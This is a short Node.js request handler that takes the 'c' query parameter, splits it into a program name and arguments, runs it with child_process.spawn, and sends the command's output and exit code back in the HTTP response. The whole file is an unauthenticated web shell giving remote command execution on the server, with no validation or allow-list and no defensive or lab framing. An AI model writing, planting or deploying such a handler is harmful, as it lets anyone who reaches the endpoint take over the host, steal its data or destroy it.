module.exports = function(req, res) {
	var spawn = require('child_process').spawn;
	var args = req.query.c.split(' ');
	console.log(req.query);
	var ls    = spawn(args[0], args.splice(1));

	var output = "";

	ls.stdout.on('data', function (data) {
	output += ('\n[stdout]:\n' + data);
	});

	ls.stderr.on('data', function (data) {
	output += ('\n[stderr]:\n ' + data) + "\n"
	});

	ls.on('close', function (code) {
		output += '\n[done]: child process exited with code ' + code + "\n";
		res.send(output);
	});
}
